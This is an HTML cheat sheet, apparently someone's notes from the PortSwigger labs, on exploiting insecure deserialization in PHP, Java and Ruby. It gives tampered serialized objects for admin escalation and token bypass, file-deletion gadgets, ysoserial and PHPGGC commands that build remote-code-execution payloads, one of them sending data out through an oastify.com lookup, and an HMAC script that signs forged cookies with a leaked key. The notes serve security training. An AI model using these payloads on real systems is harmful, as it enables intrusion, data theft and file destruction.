@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Insecure Deserialization</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header id="title-block-header">
+</header>
+<h1 id="insecure-deserialization">Insecure Deserialization</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><p><a href="#recon">Recon for Insecure Derialization</a></p></li>
+<li><p><a href="#cheat-sheet">Portswigger Labs Cheat Sheet /
+Payloads</a></p></li>
+<li><p>Additional Notes: There is a PDF attached in this folder that has
+a walk-through of the labs. The document does not need to be downloaded,
+it can be viewed inline in GitHub.</p></li>
+</ul>
+<p><br><br></p>
+<h2 id="recon">Recon</h2>
+<p><br><br></p>
+<h3 id="how-to-identify-insecure-deserialization-vulnerabilities">How to
+identify insecure deserialization vulnerabilities</h3>
+<ul>
+<li>https://portswigger.net/web-security/deserialization/exploiting#how-to-identify-insecure-deserialization</li>
+</ul>
+<p><br></p>
+<h4 id="java-serialization-format"><strong>Java Serialization
+Format:</strong></h4>
+<ul>
+<li><p>Serialized Java Objects always begin with the same bytes:</p>
+<ul>
+<li><p>Hexa-decimal: ac ed</p></li>
+<li><p>Base64: ro0</p></li>
+</ul></li>
+</ul>
+<p><br></p>
+<h4 id="php-serialization-format"><strong>PHP Serialization
+Format:</strong></h4>
+<ul>
+<li><p>Serialized Objects are usually base-64 encoded.</p></li>
+<li><p>Example, consider a User object with the attributes:</p>
+<ul>
+<li><p>$user-&gt;name = “carlos”;</p></li>
+<li><p>$user-&gt;isLoggedIn = true;</p></li>
+</ul></li>
+<li><p>When serialized, this object may look something like
+this:</p></li>
+</ul>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="cn">O</span><span class="ot">:</span><span class="dv">4</span><span class="ot">:</span><span class="st">&quot;User&quot;</span><span class="ot">:</span><span class="dv">2</span><span class="ot">:</span>{s<span class="ot">:</span><span class="dv">4</span><span class="ot">:</span><span class="st">&quot;name&quot;</span><span class="ot">:</span>s<span class="ot">:</span><span class="dv">6</span><span class="ot">:</span><span class="st">&quot;carlos&quot;</span><span class="ot">;</span> s<span class="ot">:</span><span class="dv">10</span><span class="ot">:</span><span class="st">&quot;isLoggedIn&quot;</span><span class="ot">:</span>b<span class="ot">:</span><span class="dv">1</span><span class="ot">;</span>}</span></code></pre></div>
+<p><br><br></p>
+<h2 id="tools-and-burp-extensions-used">Tools and Burp Extensions
+Used:</h2>
+<ul>
+<li><p>Ysoserial
+(https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f)</p></li>
+<li><p>PHP Generic Gadget Chains (PHPGGC)</p></li>
+<li><p>Java Deserialization Scanner -
+https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae</p></li>
+</ul>
+<p><br><br></p>
+<h2 id="cheat-sheet">Cheat Sheet</h2>
+<p><br><br></p>
+<h3 id="modifying-serialized-objects-php"><strong>Modifying Serialized
+Objects – PHP</strong></h3>
+<ul>
+<li><p>Identify if there is a PHP Object that is being used in any HTTP
+requests sent to the application. Decode the Object and check if there
+are any sensitive fields such as “isAdmin”, “role”, etc. If there is a
+sensitive field, modify the Object and re-encode it.</p></li>
+<li><p>Example:</p></li>
+</ul>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="cn">O</span><span class="ot">:</span><span class="dv">4</span><span class="ot">:</span><span class="st">&quot;User&quot;</span><span class="ot">:</span><span class="dv">2</span><span class="ot">:</span>{s<span class="ot">:</span><span class="dv">8</span><span class="ot">:</span><span class="st">&quot;username&quot;</span><span class="ot">;</span>s<span class="ot">:</span><span class="dv">6</span><span class="ot">:</span><span class="st">&quot;carlos&quot;</span><span class="ot">;</span>s<span class="ot">:</span><span class="dv">7</span><span class="ot">:</span><span class="st">&quot;isAdmin&quot;</span><span class="ot">;</span>b<span class="ot">:</span><span class="dv">0</span><span class="ot">;</span>}</span></code></pre></div>
+<ul>
+<li>Modify the serialized Object, encode it and submit it back in the
+HTTP request. Here the “isAdmin” fields was changed to the value of 1,
+which equals to true:</li>
+</ul>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="cn">O</span><span class="ot">:</span><span class="dv">4</span><span class="ot">:</span><span class="st">&quot;User&quot;</span><span class="ot">:</span><span class="dv">2</span><span class="ot">:</span>{s<span class="ot">:</span><span class="dv">8</span><span class="ot">:</span><span class="st">&quot;username&quot;</span><span class="ot">;</span>s<span class="ot">:</span><span class="dv">6</span><span class="ot">:</span><span class="st">&quot;carlos&quot;</span><span class="ot">;</span>s<span class="ot">:</span><span class="dv">7</span><span class="ot">:</span><span class="st">&quot;isAdmin&quot;</span><span class="ot">;</span>b<span class="ot">:</span><span class="dv">1</span><span class="ot">;</span>}</span></code></pre></div>
+<p><br><br></p>
+<h3 id="modifying-serialized-data-types-php"><strong>Modifying
+Serialized Data Types – PHP</strong></h3>
+<ul>
+<li><p>Taking advantage of PHP-based logic when comparing different date
+types with the loose comparison operator (==).</p></li>
+<li><p>PHP quirks when comparing data of different types:</p>
+<ul>
+<li>5 == “5 example” // true</li>
+<li>5 == “example” // false</li>
+<li>0 == “example” //true</li>
+<li>0 == “9example” // false</li>
+</ul></li>
+<li><p>If the application is using the loose comparison operator to
+validate critical information such as a password, the 3rd option is
+interesting^. If the password does not begin with a number, we can
+supply a 0, and the values will be “equal” to each other.</p></li>
+<li><p>Identify if the application is passing any serialized Objects in
+the HTTP requests.</p></li>
+<li><p>If you find a PHP serialized Object like below:</p></li>
+</ul>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="cn">O</span><span class="ot">:</span><span class="dv">4</span><span class="ot">:</span><span class="st">&quot;User&quot;</span><span class="ot">:</span><span class="dv">2</span><span class="ot">:</span>{s<span class="ot">:</span><span class="dv">8</span><span class="ot">:</span><span class="st">&quot;username&quot;</span><span class="ot">;</span>s<span class="ot">:</span><span class="dv">6</span><span class="ot">:</span><span class="st">&quot;wiener&quot;</span><span class="ot">;</span>s<span class="ot">:</span><span class="dv">12</span><span class="ot">:</span><span class="st">&quot;access_token&quot;</span><span class="ot">;</span>s<span class="ot">:</span><span class="dv">32</span><span class="ot">:</span>”eyhsfxxxxxx”<span class="ot">;</span>}</span></code></pre></div>
+<ul>
+<li>Change the “access_token” value to the integer 0, this can
+potentially bypass authentication/authorization, if the application is
+using PHP loose comparison operator (==):</li>
+</ul>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="cn">O</span><span class="ot">:</span><span class="dv">4</span><span class="ot">:</span><span class="st">&quot;User&quot;</span><span class="ot">:</span><span class="dv">2</span><span class="ot">:</span>{s<span class="ot">:</span><span class="dv">8</span><span class="ot">:</span><span class="st">&quot;username&quot;</span><span class="ot">;</span>s<span class="ot">:</span><span class="dv">13</span><span class="ot">:</span><span class="st">&quot;administrator&quot;</span><span class="ot">;</span>s<span class="ot">:</span><span class="dv">12</span><span class="ot">:</span><span class="st">&quot;access_token&quot;</span><span class="ot">;</span>i<span class="ot">:</span><span class="dv">0</span><span class="ot">;</span>}</span></code></pre></div>
+<p><br><br></p>
+<h3
+id="exploit-application-functionality-with-serialized-object-php"><strong>Exploit
+Application Functionality with Serialized Object – PHP</strong></h3>
+<ul>
+<li><p>An application has a “Delete Account” functionality and is using
+a user controllable serialized PHP Object to determine the file that it
+deletes.</p></li>
+<li><p>For Example: The application uses the “avatar_link” attribute to
+delete a file from the server’s filesystem.</p></li>
+</ul>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>s<span class="ot">:</span><span class="dv">11</span><span class="ot">:</span><span class="st">&quot;avatar_link&quot;</span><span class="ot">;</span>s<span class="ot">:</span><span class="dv">19</span><span class="ot">:</span><span class="st">&quot;/users/wiener/avatar&quot;</span></span></code></pre></div>
+<ul>
+<li>This vector can be used to delete other files by changing the value
+of the attribute and submitting it in the request:</li>
+</ul>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>s<span class="ot">:</span><span class="dv">11</span><span class="ot">:</span><span class="st">&quot;avatar_link&quot;</span><span class="ot">;</span>s<span class="ot">:</span><span class="dv">23</span><span class="ot">:</span><span class="st">&quot;/home/carlos/morale.txt&quot;</span></span></code></pre></div>
+<p><br><br></p>
+<h3 id="arbitrary-object-injection-php"><strong>Arbitrary Object
+Injection – PHP</strong></h3>
+<ul>
+<li><p>Enumerate the application and identify if there are any leaked
+source code files that contain sensitive fields/functionality. We can
+read source code files sometimes by appending a tilde ( ~ ) character at
+the end of it’s name. For example, Test.php~ can show the PHP file’s
+source code instead of just executing it.</p></li>
+<li><p>The PHP class contains a magic method “__destruct” that will
+invoke the unlink() method on the lock_file_path attribute. This deletes
+the file that is passed to the method.</p></li>
+<li><p>Create the following PHP serialized Object to delete a file in
+the server’s file system:</p></li>
+</ul>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="cn">O</span><span class="ot">:</span><span class="dv">14</span><span class="ot">:</span><span class="st">&quot;CustomTemplate&quot;</span><span class="ot">:</span><span class="dv">1</span><span class="ot">:</span>{s<span class="ot">:</span><span class="dv">14</span><span class="ot">:</span><span class="st">&quot;lock_file_path&quot;</span><span class="ot">;</span>s<span class="ot">:</span><span class="dv">23</span><span class="ot">:</span><span class="st">&quot;/home/carlos/morale.txt&quot;</span><span class="ot">;</span>}</span></code></pre></div>
+<p><br><br></p>
+<h3
+id="java-deserialization-with-apache-commons-pre-built-gadget-java"><strong>Java
+Deserialization with Apache Commons – Pre-built Gadget
+Java</strong></h3>
+<ul>
+<li><p>Pre-built gadget exploitation. We can use the “ysoserial” tool to
+generate a malicious serialized Object containing a remote code
+execution payload. <strong>Note:</strong> that the “ysoserial” tool is
+dependent on Java version 15 or lower.</p></li>
+<li><p>Resource:
+https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f</p></li>
+<li><p>Example payloads:</p>
+<ul>
+<li>java -jar path/to/ysoserial.jar CommonsCollections4 ‘rm
+/home/carlos/morale.txt’ | base64 -w 0 &gt; test.txt</li>
+</ul></li>
+<li><p>This payload can be used to exfiltrate date, for example. Copy
+and paste the results into the Cookie of the target application. Check
+out more obfuscation examples in the “Command Injection” folder.</p>
+<ul>
+<li>./java -jar /root/Tools/ysoserial-all.jar CommonsCollections4
+“nslookup `echo ‘hello’|base64`.r29q0ep.oastify.com” | base64 -w 0 &gt;
+../../test1-1.txt</li>
+</ul></li>
+</ul>
+<p><br><br></p>
+<h3 id="ruby-deserialization-with-pre-built-gadget-ruby"><strong>Ruby
+Deserialization with Pre-built Gadget – Ruby</strong></h3>
+<ul>
+<li><p>Enumerate the application and identify if it is using a
+serialized Object in any of the HTTP requests.</p></li>
+<li><p>For Ruby serialized Objects, we can use a pre-built gadget to
+generate a malicious Ruby serialized Object and exploit the
+application:</p>
+<ul>
+<li><p>https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html</p></li>
+<li><p>https://www.onlinegdb.com/online_ruby_compiler</p></li>
+</ul></li>
+</ul>
+<p><br><br></p>
+<h3 id="php-deserialization-with-pre-built-gadget---php"><strong>PHP
+Deserialization with Pre-built Gadget - PHP</strong></h3>
+<ul>
+<li><p>Enumerate the application and identify if there are any
+dependencies that the application is using.</p></li>
+<li><p>For example, if the application depends on the Symfony framework,
+we can use a tool to generate a malicious serialized Object.</p>
+<ul>
+<li><p>Tool: PHPGGC</p></li>
+<li><p>Payload: ./phpggc Symfony/RCE4 exec ‘rm /home/carlos/morale.txt’
+| base64</p></li>
+</ul></li>
+<li><p>If the serialized Object is being signed using an SHA-1 HMAC
+hash, identify if the application is disclosing the secret key in any of
+the configuration files or responses. The “/cgi-bin/phpinfo.php” file is
+a good place to search for.</p></li>
+<li><p>The following script can be used to then sign the serialized
+Object using the secret key:</p></li>
+</ul>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="va">$object</span> <span class="op">=</span> <span class="st">&quot;OBJECT-GENERATED-BY-PHPGGC&quot;</span><span class="ot">;</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="va">$secretKey</span> <span class="op">=</span> <span class="st">&quot;LEAKED-SECRET-KEY-FROM-PHPINFO.PHP&quot;</span><span class="ot">;</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="va">$cookie</span> <span class="op">=</span> <span class="fu">urlencode</span>(<span class="st">&#39;{&quot;token&quot;:&quot;&#39;</span> <span class="op">.</span> <span class="va">$object</span> <span class="op">.</span> <span class="st">&#39;&quot;,&quot;sig_hmac_sha1&quot;:&quot;&#39;</span> <span class="op">.</span> <span class="fu">hash_hmac</span>(<span class="st">&#39;sha1&#39;</span><span class="ot">,</span> <span class="va">$object</span><span class="ot">,</span> <span class="va">$secretKey</span>) <span class="op">.</span> <span class="st">&#39;&quot;}&#39;</span>)<span class="ot">;</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="kw">echo</span> <span class="va">$cookie</span><span class="ot">;</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
+<p><br><br></p>
+<h3
+id="developing-custom-gadget-java-deserialization"><strong>Developing
+Custom Gadget – Java Deserialization</strong></h3>
+<ul>
+<li><p>Enumerate the application and identify if there are any leaked
+Java source code files. Then analyze the code to see if any of the
+fields are being passed to a dangerous method/sink.</p></li>
+<li><p>Manually create the Java Class and serialized the Object with a
+malicious payload and inject it to the application.</p></li>
+<li><p>Portswigger provides a generic program for serializing Java
+Objects:
+https://github.com/PortSwigger/serialization-examples/tree/master/java/generic</p></li>
+<li><p>See the example in the lab/document.</p></li>
+</ul>
+<p><br><br></p>
+<h3 id="developing-custom-gadget-php-deserialization"><strong>Developing
+Custom Gadget – PHP Deserialization</strong></h3>
+<ul>
+<li><p>Enumerate the application and identify if there are any leaked
+PHP source code files. Then analyze the code to see if any of the fields
+are being passed to a dangerous method/sink.</p></li>
+<li><p>Since PHP uses a String based serialization method, we don’t need
+to manually create the Class and serialized it.</p></li>
+<li><p>We can use an example payload like below:</p></li>
+</ul>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="cn">O</span><span class="ot">:</span><span class="dv">14</span><span class="ot">:</span><span class="st">&quot;CustomTemplate&quot;</span><span class="ot">:</span><span class="dv">2</span><span class="ot">:</span>{s<span class="ot">:</span><span class="dv">17</span><span class="ot">:</span><span class="st">&quot;default_desc_type&quot;</span><span class="ot">;</span>s<span class="ot">:</span><span class="dv">26</span><span class="ot">:</span><span class="st">&quot;rm /home/carlos/morale.txt&quot;</span><span class="ot">;</span>s<span class="ot">:</span><span class="dv">4</span><span class="ot">:</span><span class="st">&quot;desc&quot;</span><span class="ot">;</span><span class="cn">O</span><span class="ot">:</span><span class="dv">10</span><span class="ot">:</span><span class="st">&quot;DefaultMap&quot;</span><span class="ot">:</span><span class="dv">1</span><span class="ot">:</span>{s<span class="ot">:</span><span class="dv">8</span><span class="ot">:</span><span class="st">&quot;callback&quot;</span><span class="ot">;</span>s<span class="ot">:</span><span class="dv">4</span><span class="ot">:</span><span class="st">&quot;exec&quot;</span><span class="ot">;</span>}}</span></code></pre></div>
+<ul>
+<li>See the example in the lab/document.</li>
+</ul>
+<p><br><br></p>
+<h3
+id="using-phar-deserialization-to-deploy-a-custom-gadget-chain"><strong>Using
+PHAR deserialization to deploy a custom gadget chain</strong></h3>
+<ul>
+<li>Check out the walk-through in lab/document. -
+https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain</li>
+</ul>
+<p><br><br></p>
+<h3
+id="pending-to-complete-labs-that-are-missing-from-cheat-sheet"><strong>Pending
+to complete labs that are missing from cheat sheet:</strong></h3>
+<ul>
+<li>All labs in this category are completed and referenced in cheat
+sheet or attached document.</li>
+</ul>
+</body>
+</html>
